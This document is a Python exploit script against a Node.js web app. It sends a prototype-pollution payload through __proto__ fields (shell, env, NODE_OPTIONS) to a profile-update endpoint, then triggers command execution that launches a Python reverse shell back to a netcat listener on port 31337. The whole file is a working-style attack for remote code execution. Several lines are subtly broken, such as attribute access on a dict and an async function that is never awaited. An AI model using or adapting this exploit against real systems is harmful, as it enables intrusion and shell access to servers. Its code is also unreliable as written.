import httpx
import asyncio

async def exploit():
  callback = {
    "ip": "10.0.2.15",
    "port": "31337"
  }
  payload = f"""python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{callback.ip}",{callback.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
  listener = await asyncio.create_subprocess_exec('nc','-lvnp 31337', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

  client = httpx.Client()
  base_url = "http://192.168.50.154:3000"
  res = client.post(base_url + "/me/update", headers={"cache-control": "no-cache"}, json={
    "firstname": "Johnny",
    "bio": "Hi, I am vulnerable to prototype pollution",
    "theme": "light",
    "__proto__": {
      "argv0": "/proc/self/exe",
      "shell": "/proc/self/exe",
      "env": { "G3T_0WN3D":f"""console.log(require('child_process').execSync({payload}).toString())//"""},
      "NODE_OPTIONS": "--require /proc/self/environ"
    }
  })
  print(res)
  print(len(res.text))

  res = client.get(base_url + "/downscale")

  stdout, stderr = await listener.communicate()

  print("Welcome!")
  
exploit()